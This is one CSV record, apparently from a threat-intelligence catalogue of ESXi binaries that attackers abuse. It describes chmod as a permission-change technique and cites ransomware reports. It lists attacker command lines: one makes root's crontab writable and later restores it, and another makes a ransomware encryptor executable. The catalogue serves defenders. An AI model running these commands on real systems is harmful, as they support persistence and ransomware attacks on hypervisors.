"chmod","An inbuilt utility that allows user's to change file and folder permissions.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","/bin/chmod +w /var/spool/cron/crontabs/root","Making a file writeable.","An adversary alters a file's permissions to allow write access. Once the file has been modified, they may revert it to more restrictive permissions to prevent it being edited by other users.","Change File Permission","User","T1222.002","ESXi","","Nevada","","[''/bin/chmod''-|-''/sbin/chmod'']","","[''https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/''-|-''https://www.reddit.com/r/esxi/comments/10txpje/i_was_attack_by_esxi_ransomware_and_the_attack/''-|-''https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire''-|-''https://www.hybrid-analysis.com/sample/be5d2e94c2498ec052fb025e3348085e418c856dd43080501acfe2067ba54c41/6553b8f44c06e50d5408581f'']","","Michael Dawson","","[''/bin/chmod -w /var/spool/cron/crontabs/root''-|-''chmod +x $CLEAN_DIR/encrypt'']","","","","","","","","","false"
